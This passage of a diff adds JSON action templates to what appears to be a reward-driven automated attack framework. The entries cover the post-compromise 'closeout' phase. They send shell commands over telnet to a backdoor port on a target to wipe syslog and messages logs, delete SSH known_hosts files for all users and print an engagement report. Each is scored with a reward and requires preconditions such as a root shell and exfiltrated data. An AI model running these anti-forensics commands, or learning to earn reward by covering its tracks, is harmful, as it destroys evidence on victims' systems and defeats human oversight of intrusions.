+        "root_shell_obtained",
+        "data_exfiltrated"
+      ],
+      "success_indicators": [
+        "CLOSEOUT_TIMESTAMPS_FIXED"
+      ],
+      "tags": [
+        "anti-forensics",
+        "timestomp",
+        "closeout",
+        "linux"
+      ],
+      "typical_reward": 8.0
+    },
+    "clear_syslog": {
+      "template": "{ echo 'cat /dev/null > /var/log/syslog && cat /dev/null > /var/log/messages 2>/dev/null && echo CLOSEOUT_SYSLOG_CLEARED'; sleep 2; } | timeout 10 telnet {target} 1524",
+      "phase": "CLOSEOUT",
+      "description": "Clear system logs (syslog, messages) to remove activity traces.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "root_shell_obtained",
+        "data_exfiltrated"
+      ],
+      "success_indicators": [
+        "CLOSEOUT_SYSLOG_CLEARED"
+      ],
+      "tags": [
+        "anti-forensics",
+        "logs",
+        "closeout",
+        "linux"
+      ],
+      "typical_reward": 7.0
+    },
+    "remove_known_hosts": {
+      "template": "{ echo 'rm -f ~/.ssh/known_hosts /root/.ssh/known_hosts /home/*/.ssh/known_hosts 2>/dev/null && echo CLOSEOUT_KNOWN_HOSTS_REMOVED'; sleep 2; } | timeout 10 telnet {target} 1524",
+      "phase": "CLOSEOUT",
+      "description": "Remove SSH known_hosts entries that record our connections.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained",
+        "data_exfiltrated"
+      ],
+      "success_indicators": [
+        "CLOSEOUT_KNOWN_HOSTS_REMOVED"
+      ],
+      "tags": [
+        "anti-forensics",
+        "linux",
+        "closeout",
+        "ssh"
+      ],
+      "typical_reward": 6.0
+    },
+    "generate_report": {
+      "template": "{ echo '=== ARIASKA ENGAGEMENT REPORT ==='; echo 'Target: {target}'; echo 'Status: CLOSEOUT COMPLETE'; echo 'Artifacts removed: YES'; echo 'Logs cleared: YES'; echo 'Target stable: VERIFIED'; echo 'REPORT_GENERATED'; sleep 2; } | timeout 10 telnet {target} 1524",
+      "phase": "CLOSEOUT",
+      "description": "Generate final engagement report. This marks the CLOSEOUT phase as COMPLETE.",
+      "required_params": [
+        "target"
+      ],
+      "optional_params": {},
+      "preconditions": [
+        "shell_obtained",
+        "data_exfiltrated"
+      ],
+      "success_indicators": [
+        "REPORT_GENERATED"
+      ],
+      "tags": [
+        "report",
+        "final",
+        "closeout",
+        "linux"
+      ],
+      "typical_reward": 15.0
+    }
+  }
+}
